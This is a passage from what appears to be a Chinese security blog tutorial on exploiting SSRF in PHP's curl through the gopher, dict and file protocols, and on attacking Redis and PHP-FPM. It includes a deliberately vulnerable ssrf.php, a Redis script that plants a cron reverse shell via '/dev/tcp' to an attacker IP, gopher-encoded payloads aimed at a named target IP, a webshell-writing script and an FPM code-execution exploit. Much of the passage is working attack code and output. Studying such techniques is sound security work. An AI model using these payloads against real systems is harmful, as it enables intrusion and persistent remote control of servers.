CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url); </span><br></pre></td></tr></table></figure>
+<p>下面就详细讲一下curl函数在ssrf中的具体利用方式。</p>
+<h2 id="利用方式">利用方式</h2>
+<h3 id="一些协议的理解">一些协议的理解</h3>
+<p>在讲利用方式之前，我们先来看看curl命令支持哪些网络协议：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ca01h:/var/www/html/ssrf<span class="comment"># curl -V</span></span><br><span class="line">url 7.66.0 (x86_64-pc-linux-gnu) libcurl/7.66.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.39.2 librtmp/2.3</span><br><span class="line">Release-Date: 2019-09-11</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp </span><br><span class="line">Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets</span><br></pre></td></tr></table></figure>
+<p>可以看到该版本的curl支持很多协议，其中gopher协议、dict协议、file协议、http/s协议用的比较多。</p>
+<h4 id="gopher">gopher</h4>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Gopher_(%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)">Gopher wiki</a></p>
+<p>互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。</p>
+<p>gopher协议的格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
+<p>gopher协议在curl命令中的使用方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://localhost:2222/hello%0agopher</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208095637.png" alt=""></p>
+<p>通过nc回显可以发现，数据换行了， 然而 hello 只回显了 ello ，也就是说 h “被吃了”, 因此要在传输的数据前加一个无用字符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://localhost:2222/_hello%0agopher</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果是在地址栏利用payload时，需要进行一次url编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.130&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;localhost:2222&#x2F;_hello%250agopher</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>再利用ssrf.php：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726</span><br><span class="line"> </span><br><span class="line">[root@ca01h html]<span class="comment"># curl -v &#x27;http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test&#x27;</span></span><br><span class="line"> </span><br><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726.</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="dict">dict</h4>
+<p>字典服务器协议。dict是基于查询相应的TCP协议。服务器监听端口2628。漏洞代码没有屏蔽回显的情况下，可以利用dict协议获取ssh等服务版本信息。</p>
+<p>因为ssrf.php的漏洞代码有回显，所以curl命令直接访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>即可看到redis的相关配置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:22/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>即可看到ssh的banner信息。</p>
+<p>如果ssrf.php中加上一行屏蔽回显的代码<code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</p>
+<h4 id="file">file</h4>
+<p>本地文件传输协议，主要用于访问本地计算机中的文件。</p>
+<p>因为ssrf.php的漏洞代码有回显，所以浏览器直接访问：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208104710.png" alt=""></p>
+<h4 id="http-s">http/s</h4>
+<p>主要用来探测内网服务。根据响应的状态判断内网端口及服务，可以结合java系列0day和其他各种0day使用。</p>
+<h3 id="攻击Redis">攻击Redis</h3>
+<blockquote>
+<p>目标：阿里云服务器 Centos7 IP：47.97.199.89</p>
+<p>攻击：华为云服务器 Centos7 IP：121.36.45.17</p>
+<p>具体环境搭建请转到文章末尾的Appendix B。</p>
+</blockquote>
+<h4 id="Redis反弹Shell（root权限）">Redis反弹Shell（root权限）</h4>
+<blockquote>
+<p>什么是反弹Shell：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+</blockquote>
+<p>先写一个redis反弹shell的bash脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.sh</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在redis的第0个数据库中添加key为1，value为\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<code>CONFIG SET</code> 命令动态地调整 Redis 服务器的配置，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面，<code>set</code>直接往当前用户的crontab里写入反弹shell。</p>
+<p>想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br><span class="line">bash shell.sh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>意思是将本机的4444端口转发到本机的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。捕获到数据如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.167534  length&#x3D;89 from&#x3D;0 to&#x3D;88</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$62\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.167814  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.171555  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.171779  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.175397  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.175619  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.179000  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.185711  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.189649  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.189817  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>转换规则如下：</p>
+<ul>
+<li>如果第一个字符是<code>&gt;</code>或者<code>&lt; </code>那么丢弃该行字符串，表示请求和返回的时间。</li>
+<li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li>
+<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
+<li>空白行替换为<code>%0a</code></li>
+</ul>
+<p>转换脚本：<code>tran2gopher.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">python tran2gopher.py socat.log</span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">1</span>] <span class="keyword">in</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                exp = exp + line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line">exp.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;%24&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;%3C&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;%3E&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;%3F&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在攻击方执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;gopher://47.97.199.89</span></span><br><span class="line"><span class="string">:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.179/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>出现5个ok，则成功了写入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Trying 47.97.199.89:6379...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 47.97.199.89 (47.97.199.89) port 6379 (#0)</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">* Closing connection 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>那再检测以下Redis写入的字段和crontab的内容。</p>
+<ul>
+<li>检测Redis数据库的字段为<code>&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n\n&quot;</code></li>
+<li>检测crontab的内容也没有问题。</li>
+</ul>
+<p>最后在目标机上监听端口2333：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>稍等一下，就可以成功反弹shell。</p>
+<h4 id="获取-web-服务的-webshell">获取 web 服务的 webshell</h4>
+<p>当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell。</p>
+<p>模仿上面的shell脚本来写：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell2.php</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/www/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> <span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：一定要在$POST前面加上转义符\，不然在最后的文件里面$_POST会被吞掉！！！（因为$符号是redis的一种语法）</p>
+</blockquote>
+<p>执行shell2.php，同样使用socat在4444端口转发。</p>
+<p>捕获到的数据如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$8\r</span><br><span class="line">&#x2F;var&#x2F;www\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$9\r</span><br><span class="line">shell.php\r</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">web\r</span><br><span class="line">$18\r</span><br><span class="line">%3C%3Fphp%20phpinfo()%3B%3F%3E\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>参考joychou写cron的脚本转换，python转换脚本如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; open(&#39;payload.txt&#39;, &#39;r&#39;)</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line">for line in f.readlines():</span><br><span class="line">        line &#x3D; line.replace(r&quot;\r&quot;, &quot;%0d%0a&quot;)</span><br><span class="line">        line &#x3D; line.replace(&quot;\n&quot;, &#39;&#39;)</span><br><span class="line">        s &#x3D; s + line</span><br><span class="line">print s.replace(&quot;$&quot;, &quot;%24&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如上的写shell数据流经过编码如下(注意php一句话，经过上面转换还是尖括号，但是使用curl发送的时候要把一句话的两个尖括号和<code>;</code>和<code>?</code>url编码，然后使用curl直接发送如下，我也不知道为啥<code>$</code>还要编码，知道的同学请告知，谢谢）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># python tran2gopher.py socat2.log</span></span><br><span class="line">curl -v <span class="string">&quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit%0d%0a&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后上面的payload在存在ssrf的时候，使用发送之前要再url编码一次，发送即可得到shell。</p>
+<h3 id="攻击fastcgi（TCP模式）">攻击fastcgi（TCP模式）</h3>
+<blockquote>
+<p>环境搭建请转到文章莫问的Appendix B。</p>
+</blockquote>
+<h4 id="什么是fastcgi">什么是fastcgi</h4>
+<p>请转到文章末尾的Appendix A。</p>
+<p>fastcgi默认监听端口为本机的9000端口，如果对外开放的话就有可能造成任意代码执行（具体看p牛文章介绍，讲的非常详细了）。但是一般情况不会对外开放的，所以此时需要配合gopher+ssrf加以利用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件: </span><br><span class="line">libcurl版本&gt;&#x3D;7.45.0 (exp中存在%00，curl版本小于7.45.0，gopher的%00会被截断) </span><br><span class="line">PHP-FPM监听端口 </span><br><span class="line">PHP-FPM版本 &gt;&#x3D; 5.3.3 </span><br><span class="line">知道服务器上任意一个php文件的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="远程攻击php-fpm">远程攻击php-fpm</h4>
+<p>这个场景是有些管理员为了方便吧,把fastcgi监听端口设置为: <code>listen = 0.0.0.0:9000</code>而不是<code>listen = 127.0.0.1:9000</code> 这样子可以导致远程代码执行。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160010.png" alt=""></p>
+<p>这里利用p牛的exploit脚本:</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">fpm.py</a></p>
+<p>python命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py -c <span class="string">&#x27;&lt;?php echo `id`;exit;?&gt;&#x27;</span> 192.168.188.130 /var/www/html/index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160340.png" alt=""></p>
+<h4 id="SSRF攻击本地的php-fpm">SSRF攻击本地的php-fpm</h4>
+<h5 id="基本原理">基本原理</h5>
+<p>PHP-FPM开放在公网上的情况是很少的，大部分时候都是启动在本地即监听127.0.0.1:9000地址的。</p>
+<p>虽然我们没有办法直接对PHP-FPM发起攻击，但是我们可以结合其他漏洞来间接利用。如果目标站点存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果。</p>
+<h5 id="利用方式-v2">利用方式</h5>
+<p>之前已经提到Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，再进行urlencode编码来构造SSRF攻击代码，其中攻击代码就是恶意FastCGI协议报文。</p>
+<p>这里有三种方式来生成恶意FastCGI协议报文：</p>
+<p>一种是不用修改P牛的脚本，在本即上直接将流量打到某一个端口（比如9999），同时监听此端口，再保存到本地后进行url编码（此时要求本机上也有php-fpm服务）。</p>
